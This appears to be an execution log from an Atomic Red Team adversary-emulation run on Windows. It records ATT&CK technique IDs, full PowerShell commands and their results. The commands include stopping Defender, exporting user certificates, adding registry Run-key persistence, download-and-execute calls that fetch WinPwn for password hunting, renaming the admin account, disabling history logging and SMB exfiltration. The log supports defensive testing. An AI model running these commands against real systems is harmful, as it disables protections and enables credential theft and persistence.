 'description': 'This test will attempt to allow an executable through the '
                'system firewall located in the Users directory',
 'executor': 'psh',
 'link_id': '4da33995-46eb-4f09-99b7-4b1b3613faf9',
 'name': 'Allow Executable Through Firewall Located in Non-Standard Location',
 'pid': 7180,
 'plaintext_command': 'Copy-Item "f7ce09_AtomicTest.exe" -Destination '
                      '"C:\\Users\\$env:UserName" -Force; netsh advfirewall '
                      'firewall add rule name="Atomic Test" dir=in '
                      'action=allow '
                      'program="C:\\Users\\$env:UserName\\AtomicTest.exe" '
                      'enable=yes',
 'platform': 'windows',
 'run': '2023-12-03T16:01:05Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__0402c74f97e712d03605175c5ba9675b__trial_1

atomic_ordering: ['0402c74f97e712d03605175c5ba9675b']
------------------------------
{'ability_id': '0402c74f97e712d03605175c5ba9675b',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'Try {cmd /c '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe" '
            '/EXEFilename "$env:systemroot\\System32\\sc.exe" /WindowState 0 '
            '/CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} '
            'Catch{}; if(0){;   $CommandToRun = rmdir '
            '"$env:programdata\\Microsoft\\Windows Defender" -Recurse;   Try '
            '{cmd /c '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe" '
            '/EXEFilename '
            '"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe" '
            '/WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" '
            '/RunAs 8 /Run} Catch{}; }',
 'delegated': '2023-12-03T08:54:39Z',
 'description': 'Information on NirSoft AdvancedRun and its creators found '
                'here: http://www.nirsoft.net/utils/advanced_run.html\n'
                'This Atomic will run AdvancedRun.exe with similar behavior '
                'identified during the WhisperGate campaign.\n'
                'See '
                'https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\n'
                'Upon successful execution, AdvancedRun.exe will attempt to '
                'run and stop Defender, and optionally attempt to delete the '
                'Defender folder on disk. \n',
 'executor': 'psh',
 'link_id': 'c59663b2-0174-4f3f-99c4-4857357f7274',
 'name': 'Disable Defender Using NirSoft AdvancedRun',
 'pid': 3240,
 'plaintext_command': 'Try {cmd /c '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe" '
                      '/EXEFilename "$env:systemroot\\System32\\sc.exe" '
                      '/WindowState 0 /CommandLine "stop WinDefend" '
                      '/StartDirectory "" /RunAs 8 /Run} Catch{}; if(0){;   '
                      '$CommandToRun = rmdir '
                      '"$env:programdata\\Microsoft\\Windows Defender" '
                      '-Recurse;   Try {cmd /c '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe" '
                      '/EXEFilename '
                      '"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe" '
                      '/WindowState 0 /CommandLine "$CommandToRun" '
                      '/StartDirectory "" /RunAs 8 /Run} Catch{}; }',
 'platform': 'windows',
 'run': '2023-12-03T08:54:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_014__multiple__active_setup__22f293978e324252426f9c7e337ae181__trial_1

atomic_ordering: ['22f293978e324252426f9c7e337ae181']
==============================
==============================
adversary_id: atomic__t1649__credential-access__steal_or_forge_authentication_certificates__b41910e3770cff37dd642650f0d91672__trial_1

atomic_ordering: ['b41910e3770cff37dd642650f0d91672']
------------------------------
{'ability_id': 'b41910e3770cff37dd642650f0d91672',
 'agent_reported_time': '2023-11-11T13:10:33Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1649',
            'technique_name': 'Steal or Forge Authentication Certificates'},
 'command': '$archive="$env:PUBLIC\\T1649\\atomic_certs.zip"; '
            '$exfilpath="$env:PUBLIC\\T1649\\certs"; Add-Type -assembly '
            '"system.io.compression.filesystem"; Remove-Item $(split-path '
            '$exfilpath) -Recurse -Force -ErrorAction Ignore; mkdir $exfilpath '
            '| Out-Null; foreach ($cert in (gci Cert:\\CurrentUser\\My)) { '
            'Export-Certificate -Cert $cert -FilePath '
            '$exfilpath\\$($cert.FriendlyName).cer}; '
            '[io.compression.zipfile]::CreateFromDirectory($exfilpath, '
            '$archive)',
 'delegated': '2023-12-04T05:22:15Z',
 'description': 'Export all user certificates and add to a compressed '
                'archive.\n',
 'executor': 'psh',
 'link_id': '1b6462ca-ae69-45cf-8b76-bed6db568b56',
 'name': 'Staging Local Certificates via Export-Certificate',
 'pid': 6424,
 'plaintext_command': '$archive="$env:PUBLIC\\T1649\\atomic_certs.zip"; '
                      '$exfilpath="$env:PUBLIC\\T1649\\certs"; Add-Type '
                      '-assembly "system.io.compression.filesystem"; '
                      'Remove-Item $(split-path $exfilpath) -Recurse -Force '
                      '-ErrorAction Ignore; mkdir $exfilpath | Out-Null; '
                      'foreach ($cert in (gci Cert:\\CurrentUser\\My)) { '
                      'Export-Certificate -Cert $cert -FilePath '
                      '$exfilpath\\$($cert.FriendlyName).cer}; '
                      '[io.compression.zipfile]::CreateFromDirectory($exfilpath, '
                      '$archive)',
 'platform': 'windows',
 'run': '2023-12-04T05:22:28Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__9b74d10b3164f13d357830d1a6ee334a__trial_1

atomic_ordering: ['9b74d10b3164f13d357830d1a6ee334a']
------------------------------
{'ability_id': '9b74d10b3164f13d357830d1a6ee334a',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.001',
            'technique_name': 'Boot or Logon Autostart Execution: Registry Run '
                              'Keys / Startup Folder'},
 'command': '$RunKey = '
            '"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"; '
            'Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value '
            '"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass '
            '-File"',
 'delegated': '2023-12-02T03:07:10Z',
 'description': 'This Atomic will create a registry key called '
                'socks5_powershell for persistance access\n'
                'https://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n',
 'executor': 'psh',
 'link_id': '033f657d-7ce1-41c4-b7ba-45456fa46a20',
 'name': 'SystemBC Malware-as-a-Service Registry',
 'pid': 9388,
 'plaintext_command': '$RunKey = '
                      '"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"; '
                      'Set-ItemProperty -Path $RunKey -Name '
                      '"socks5_powershell" -Value "powershell.exe -windowstyle '
                      'hidden -ExecutionPolicy Bypass -File"',
 'platform': 'windows',
 'run': '2023-12-02T03:08:03Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1046__discovery__network_service_discovery__01f95fd0213aeb1eb07fca8dc548f5ce__trial_1

atomic_ordering: ['01f95fd0213aeb1eb07fca8dc548f5ce']
------------------------------
{'ability_id': '01f95fd0213aeb1eb07fca8dc548f5ce',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1046',
            'technique_name': 'Network Service Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'fruit -noninteractive -consoleoutput',
 'delegated': '2023-11-27T17:27:50Z',
 'description': 'Search for potentially vulnerable web apps (low hanging '
                'fruits) using fruit function of WinPwn',
 'executor': 'psh',
 'link_id': 'd8401545-2d3f-44a5-9721-6df3b2dbb358',
 'name': 'WinPwn - fruit',
 'pid': 684,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'fruit -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-11-27T17:27:57Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1027__defense-evasion__obfuscated_files_or_information__1827aa5862b0a63ce537ed37636933d5__trial_1

atomic_ordering: ['1827aa5862b0a63ce537ed37636933d5']
------------------------------
{'ability_id': '1827aa5862b0a63ce537ed37636933d5',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1027',
            'technique_name': 'Obfuscated Files or Information'},
 'command': 'Send-MailMessage -From',
 'delegated': '2023-11-27T11:57:13Z',
 'description': 'Upon successful execution, an excel containing VBA Macro '
                'containing sensitive data will be sent outside the network '
                'using email.\n'
                'Sensitive data includes about around 20 odd simulated credit '
                'card numbers that passes the LUHN check.\n',
 'executor': 'psh',
 'link_id': '0c7719d0-db47-4c24-ab0a-3df16c5d4591',
 'name': 'DLP Evasion via Sensitive Data in VBA Macro over email',
 'pid': 9236,
 'plaintext_command': 'Send-MailMessage -From',
 'platform': 'windows',
 'run': '2023-11-27T11:57:21Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__9c2f9c808a72b05686236a63e1da93c8__trial_1

atomic_ordering: ['9c2f9c808a72b05686236a63e1da93c8']
------------------------------
{'ability_id': '9c2f9c808a72b05686236a63e1da93c8',
 'agent_reported_time': '2023-11-11T13:09:51Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.001',
            'technique_name': 'Unsecured Credentials: Credentials In Files'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'passhunt -local $true -noninteractive',
 'delegated': '2023-12-02T15:06:27Z',
 'description': 'Search for Passwords on this system using passhunt via WinPwn',
 'executor': 'psh',
 'link_id': '36a36e21-de58-4036-800b-613cecb00572',
 'name': 'WinPwn - passhunt',
 'pid': 9640,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'passhunt -local $true -noninteractive',
 'platform': 'windows',
 'run': '2023-12-02T15:07:47Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1530__collection__data_from_cloud_storage_object__6f408258cabdeda38f81cfdc239fb6c0__trial_1

atomic_ordering: ['6f408258cabdeda38f81cfdc239fb6c0']
==============================
==============================
adversary_id: atomic__t1197__multiple__bits_jobs__5a9be3b1696cc0cce8557f9596547e13__trial_1

atomic_ordering: ['5a9be3b1696cc0cce8557f9596547e13']
------------------------------
{'ability_id': '5a9be3b1696cc0cce8557f9596547e13',
 'agent_reported_time': '2023-11-11T13:10:00Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1197',
            'technique_name': 'BITS Jobs'},
 'command': 'Start-BitsTransfer -Priority foreground -Source '
            'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md '
            '-Destination $env:TEMP\\bitsadmin2_flag.ps1',
 'delegated': '2023-11-30T13:03:53Z',
 'description': 'This test simulates an adversary leveraging bitsadmin.exe to '
                'download\n'
                'and execute a payload leveraging PowerShell\n'
                '\n'
                'Upon execution you will find a github markdown file '
                'downloaded to the Temp directory\n',
 'executor': 'psh',
 'link_id': '490ce9af-6ea9-425b-b708-262acc5e8365',
 'name': 'Bitsadmin Download (PowerShell)',
 'pid': 4532,
 'plaintext_command': 'Start-BitsTransfer -Priority foreground -Source '
                      'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md '
                      '-Destination $env:TEMP\\bitsadmin2_flag.ps1',
 'platform': 'windows',
 'run': '2023-11-30T13:04:11Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1570__lateral-movement__lateral_tool_transfer__5458332f329c896a133982a7df20d358__trial_1

atomic_ordering: ['5458332f329c896a133982a7df20d358']
------------------------------
{'ability_id': '5458332f329c896a133982a7df20d358',
 'agent_reported_time': '2023-11-11T13:11:06Z',
 'attack': {'tactic': 'lateral-movement',
            'technique_id': 'T1570',
            'technique_name': 'Lateral Tool Transfer'},
 'command': "NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC "
            "/SKIPCERTCHECK; copy 'C:\\path\\to\\file.txt' '*:\\'",
 'delegated': '2023-12-03T23:08:47Z',
 'description': 'Simulates an attacker exfiltrating data over SMB over QUIC '
                'using the NET USE command.\n'
                'Prerequisites:\n'
                '  - A file server running Windows Server 2022 Datacenter: '
                'Azure Edition\n'
                '  - A Windows 11 computer\n'
                '  - Windows Admin Center\n',
 'executor': 'psh',
 'link_id': 'a4d657b4-cfe0-4ab5-994f-0fa17ede833b',
 'name': 'Exfiltration Over SMB over QUIC (NET USE)',
 'pid': 5116,
 'plaintext_command': "NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC "
                      "/SKIPCERTCHECK; copy 'C:\\path\\to\\file.txt' '*:\\'",
 'platform': 'windows',
 'run': '2023-12-03T23:09:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1217__discovery__browser_bookmark_discovery__abc25aecd2ed0524af31e79add29cc43__trial_1

atomic_ordering: ['abc25aecd2ed0524af31e79add29cc43']
------------------------------
{'ability_id': 'abc25aecd2ed0524af31e79add29cc43',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1217',
            'technique_name': 'Browser Bookmark Discovery'},
 'command': 'Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse '
            '-ErrorAction SilentlyContinue -Force',
 'delegated': '2023-11-30T17:54:59Z',
 'description': "Searches for Google Chrome's and Opera's Bookmarks file (on "
                'Windows distributions) that contains bookmarks.\n'
                'Upon execution, paths that contain bookmark files will be '
                'displayed.\n',
 'executor': 'psh',
 'link_id': 'ecb5de62-0701-4725-a6e3-bd4f9d593fe7',
 'name': 'List Google Chrome / Opera Bookmarks on Windows with powershell',
 'pid': 10992,
 'plaintext_command': 'Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks '
                      '-Recurse -ErrorAction SilentlyContinue -Force',
 'platform': 'windows',
 'run': '2023-11-30T17:55:57Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1069_001__discovery__permission_groups_discovery-_local_groups__f5b4c02bae169cb3a62ac26bb80321d6__trial_1

atomic_ordering: ['f5b4c02bae169cb3a62ac26bb80321d6']
------------------------------
{'ability_id': 'f5b4c02bae169cb3a62ac26bb80321d6',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.001',
            'technique_name': 'Permission Groups Discovery: Local Groups'},
 'command': 'get-localgroup; Get-LocalGroupMember -Name "Administrators"',
 'delegated': '2023-11-28T12:08:38Z',
 'description': 'Permission Groups Discovery utilizing PowerShell. This test '
                'will display some errors if run on a computer not connected '
                'to a domain. Upon execution, domain\n'
                'information will be displayed.\n',
 'executor': 'psh',
 'link_id': '124a85aa-a045-40cb-ba3b-90ff6b9afba0',
 'name': 'Permission Groups Discovery PowerShell (Local)',
 'pid': 5416,
 'plaintext_command': 'get-localgroup; Get-LocalGroupMember -Name '
                      '"Administrators"',
 'platform': 'windows',
 'run': '2023-11-28T12:08:52Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__1f15ab22c39a9b6bb2bb0d77276dfcb3__trial_1

atomic_ordering: ['1f15ab22c39a9b6bb2bb0d77276dfcb3']
------------------------------
{'ability_id': '1f15ab22c39a9b6bb2bb0d77276dfcb3',
 'agent_reported_time': '2023-11-11T13:09:22Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.001',
            'technique_name': 'Boot or Logon Autostart Execution: Registry Run '
                              'Keys / Startup Folder'},
 'command': '$Target = "C:\\Windows\\System32\\calc.exe"; $ShortcutLocation = '
            '"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\calc_exe.lnk"; $WScriptShell = '
            'New-Object -ComObject WScript.Shell; $Create = '
            '$WScriptShell.CreateShortcut($ShortcutLocation); '
            '$Create.TargetPath = $Target; $Create.Save()',
 'delegated': '2023-12-02T00:54:09Z',
 'description': 'Adds a non-malicious executable shortcut link to the current '
                'users startup directory. Test can be verified by going to the '
                'users startup directory and checking if the shortcut link '
                'exists. ',
 'executor': 'psh',
 'link_id': 'e0aad7c2-c717-4ebd-9460-3e9031cb3116',
 'name': 'Add Executable Shortcut Link to User Startup Folder',
 'pid': 3788,
 'plaintext_command': '$Target = "C:\\Windows\\System32\\calc.exe"; '
                      '$ShortcutLocation = '
                      '"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\calc_exe.lnk"; $WScriptShell = '
                      'New-Object -ComObject WScript.Shell; $Create = '
                      '$WScriptShell.CreateShortcut($ShortcutLocation); '
                      '$Create.TargetPath = $Target; $Create.Save()',
 'platform': 'windows',
 'run': '2023-12-02T00:54:20Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1119__collection__automated_collection__0c7c18db582bff4d0da4b4f8fdb2be49__trial_1

atomic_ordering: ['0c7c18db582bff4d0da4b4f8fdb2be49']
------------------------------
{'ability_id': '0c7c18db582bff4d0da4b4f8fdb2be49',
 'agent_reported_time': '2023-11-11T13:09:17Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1119',
            'technique_name': 'Automated Collection'},
 'command': 'New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType '
            'Directory -Force | Out-Null; Get-ChildItem -Recurse -Include '
            '*.doc | % {Copy-Item $_.FullName -destination '
            '$env:TEMP\\T1119_powershell_collection}',
 'delegated': '2023-11-30T03:27:13Z',
 'description': 'Automated Collection. Upon execution, check the users temp '
                'directory (%temp%) for the folder '
                'T1119_powershell_collection\n'
                'to see what was collected.\n',
 'executor': 'psh',
 'link_id': 'ad6925b2-6d2b-47bb-b9e3-38dbd1f5dd42',
 'name': 'Automated Collection PowerShell',
 'pid': 10068,
 'plaintext_command': 'New-Item -Path $env:TEMP\\T1119_powershell_collection '
                      '-ItemType Directory -Force | Out-Null; Get-ChildItem '
                      '-Recurse -Include *.doc | % {Copy-Item $_.FullName '
                      '-destination $env:TEMP\\T1119_powershell_collection}',
 'platform': 'windows',
 'run': '2023-11-30T03:27:38Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1074_001__collection__data_staged-_local_data_staging__4382d53f0f53399e72c728d019fffd77__trial_1

atomic_ordering: ['4382d53f0f53399e72c728d019fffd77']
------------------------------
{'ability_id': '4382d53f0f53399e72c728d019fffd77',
 'agent_reported_time': '2023-11-11T13:09:43Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1074.001',
            'technique_name': 'Data Staged: Local Data Staging'},
 'command': 'Invoke-WebRequest '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" '
            '-OutFile $env:TEMP\\discovery.bat',
 'delegated': '2023-11-28T22:48:08Z',
 'description': 'Utilize powershell to download discovery.bat and save to a '
                'local file. This emulates an attacker downloading data '
                'collection tools onto the host. Upon execution,\n'
                'verify that the file is saved in the temp directory.\n',
 'executor': 'psh',
 'link_id': 'd4acfeb7-9e37-4a2a-b066-7ac394ff60a6',
 'name': 'Stage data from Discovery.bat',
 'pid': 11088,
 'plaintext_command': 'Invoke-WebRequest '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" '
                      '-OutFile $env:TEMP\\discovery.bat',
 'platform': 'windows',
 'run': '2023-11-28T22:48:12Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__9ef143154774a6d0d74e0828e90290ac__trial_1

atomic_ordering: ['9ef143154774a6d0d74e0828e90290ac']
------------------------------
{'ability_id': '9ef143154774a6d0d74e0828e90290ac',
 'agent_reported_time': '2023-11-11T13:10:37Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1098',
            'technique_name': 'Account Manipulation'},
 'command': '$x = Get-Random -Minimum 2 -Maximum 9999; $y = Get-Random '
            '-Minimum 2 -Maximum 9999; $z = Get-Random -Minimum 2 -Maximum '
            '9999; $w = Get-Random -Minimum 2 -Maximum 9999; Write-Host '
            'HaHa_$x$y$z; $fmm = Get-LocalGroupMember -Group Administrators '
            '|?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match '
            '"Local"} | Select Name; foreach($member in $fmm) {;     '
            'if($member -like "*Administrator*") {;         $account = '
            '$member.Name.Split("\\")[-1];         $originalDescription = '
            '(Get-LocalUser -Name $account).Description;         Set-LocalUser '
            '-Name $account -Description '
            '"atr:$account;$originalDescription".Substring(0,48);         '
            'Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z";         '
            'Write-Host "Successfully Renamed $account Account on " '
            '$Env:COMPUTERNAME;         };     }',
 'delegated': '2023-11-29T15:12:45Z',
 'description': 'Manipulate Admin Account Name\n',
 'executor': 'psh',
 'link_id': '4aa567b5-8e45-4ef0-94a4-020aff3d9a4f',
 'name': 'Admin Account Manipulate',
 'pid': 10924,
 'plaintext_command': '$x = Get-Random -Minimum 2 -Maximum 9999; $y = '
                      'Get-Random -Minimum 2 -Maximum 9999; $z = Get-Random '
                      '-Minimum 2 -Maximum 9999; $w = Get-Random -Minimum 2 '
                      '-Maximum 9999; Write-Host HaHa_$x$y$z; $fmm = '
                      'Get-LocalGroupMember -Group Administrators |?{ '
                      '$_.ObjectClass -match "User" -and $_.PrincipalSource '
                      '-match "Local"} | Select Name; foreach($member in $fmm) '
                      '{;     if($member -like "*Administrator*") {;         '
                      '$account = $member.Name.Split("\\")[-1];         '
                      '$originalDescription = (Get-LocalUser -Name '
                      '$account).Description;         Set-LocalUser -Name '
                      '$account -Description '
                      '"atr:$account;$originalDescription".Substring(0,48);         '
                      'Rename-LocalUser -Name $account -NewName '
                      '"HaHa_$x$y$z";         Write-Host "Successfully Renamed '
                      '$account Account on " $Env:COMPUTERNAME;         };     '
                      '}',
 'platform': 'windows',
 'run': '2023-11-29T15:13:28Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__df94858e92a23d274ac1d70133d9150f__trial_1

atomic_ordering: ['df94858e92a23d274ac1d70133d9150f']
------------------------------
{'ability_id': 'df94858e92a23d274ac1d70133d9150f',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.003',
            'technique_name': 'Indicator Removal on Host: Clear Command '
                              'History'},
 'command': 'Set-PSReadlineOption -HistorySaveStyle SaveNothing',
 'delegated': '2023-11-28T16:58:10Z',
 'description': 'Prevents Powershell history\n',
 'executor': 'psh',
 'link_id': '0edb0885-9855-4644-8a04-81cd13aa5418',
 'name': 'Prevent Powershell History Logging',
 'pid': 10020,
 'plaintext_command': 'Set-PSReadlineOption -HistorySaveStyle SaveNothing',
 'platform': 'windows',
 'run': '2023-11-28T16:58:26Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__9ac97b0e88af420a8c767a7512985895__trial_1

atomic_ordering: ['9ac97b0e88af420a8c767a7512985895']
------------------------------
{'ability_id': '9ac97b0e88af420a8c767a7512985895',
 'agent_reported_time': '2023-11-11T13:10:23Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.004',
            'technique_name': 'Access Token Manipulation: Parent PID Spoofing'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Start-ATHProcessUnderSpecificParent  -ParentId $PID -TestGuid '
            '12345678-1234-1234-1234-123456789123',
 'delegated': '2023-11-30T08:15:20Z',
 'description': 'Spawns a notepad.exe process as a child of the current '
                'process.',
 'executor': 'psh',
 'link_id': '847ab712-f7e0-403b-91c5-43970bb20e44',
 'name': 'Parent PID Spoofing - Spawn from Specified Process',
 'pid': 10636,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  '
                      'Start-ATHProcessUnderSpecificParent  -ParentId $PID '
                      '-TestGuid 12345678-1234-1234-1234-123456789123',
 'platform': 'windows',
 'run': '2023-11-30T08:16:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_008__defense-evasion__impair_defenses-_disable_cloud_logs__81f547e5490f66c5e2540cda92a7e47a__trial_1

atomic_ordering: ['81f547e5490f66c5e2540cda92a7e47a']
==============================
==============================
adversary_id: atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__54b98f924ee4613c7d927a3ea1dd260a__trial_1

atomic_ordering: ['54b98f924ee4613c7d927a3ea1dd260a']
------------------------------
{'ability_id': '54b98f924ee4613c7d927a3ea1dd260a',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1053.005',
            'technique_name': 'Scheduled Task/Job: Scheduled Task'},
 'command': '$xml = [System.IO.File]::ReadAllText("2cc1c4_T1053_005_WMI.xml"); '
            'Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace '
            '"Root\\Microsoft\\Windows\\TaskScheduler" -MethodName '
            '"RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }',
 'delegated': '2023-11-27T22:54:42Z',
 'description': 'Create an scheduled task that executes notepad.exe after user '
                'login from XML by leveraging WMI class PS_ScheduledTask. Does '
                'the same thing as Register-ScheduledTask cmdlet behind the '
                'scenes.\n',
 'executor': 'psh',
 'link_id': '8221bac6-d598-4922-a447-0a970a49cf36',
 'name': 'WMI Invoke-CimMethod Scheduled Task',
 'pid': 10924,
 'plaintext_command': '$xml = '
                      '[System.IO.File]::ReadAllText("2cc1c4_T1053_005_WMI.xml"); '
                      'Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace '
                      '"Root\\Microsoft\\Windows\\TaskScheduler" -MethodName '
                      '"RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; '
                      '}',
 'platform': 'windows',
 'run': '2023-11-27T22:55:39Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1120__discovery__peripheral_device_discovery__7b9c7afaefa59aab759b49af0d699ac1__trial_1

atomic_ordering: ['7b9c7afaefa59aab759b49af0d699ac1']
------------------------------
{'ability_id': '7b9c7afaefa59aab759b49af0d699ac1',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1120',
            'technique_name': 'Peripheral Device Discovery'},
 'command': 'Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, '
            'Manufacturer > $env:TEMP\\T1120_collection.txt; '
            '$Space,$Heading,$Break,$Data = Get-Content '
            '$env:TEMP\\T1120_collection.txt; @($Heading; $Break; $Data '
            '|Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content '
            '$env:TEMP\\T1120_collection.txt',
 'delegated': '2023-11-30T04:05:19Z',
 'description': 'Perform peripheral device discovery using Get-WMIObject '
                'Win32_PnPEntity',
 'executor': 'psh',
 'link_id': '639969f4-0fa2-4bba-82ed-cf1addf78fa9',
 'name': 'Win32_PnPEntity Hardware Inventory',
 'pid': 8872,
 'plaintext_command': 'Get-WMIObject Win32_PnPEntity | Format-Table Name, '
                      'Description, Manufacturer > '
                      '$env:TEMP\\T1120_collection.txt; '
                      '$Space,$Heading,$Break,$Data = Get-Content '
                      '$env:TEMP\\T1120_collection.txt; @($Heading; $Break; '
                      '$Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } '
                      '|Set-Content $env:TEMP\\T1120_collection.txt',
 'platform': 'windows',
 'run': '2023-11-30T04:05:30Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1056_004__multiple__input_capture-_credential_api_hooking__2b0df0cb121fb7ebe7ac0eed9e14b785__trial_1

atomic_ordering: ['2b0df0cb121fb7ebe7ac0eed9e14b785']
==============================
==============================
adversary_id: atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__5e3512c73a461c17ddcb1cc0bbdbeef9__trial_1

atomic_ordering: ['5e3512c73a461c17ddcb1cc0bbdbeef9']
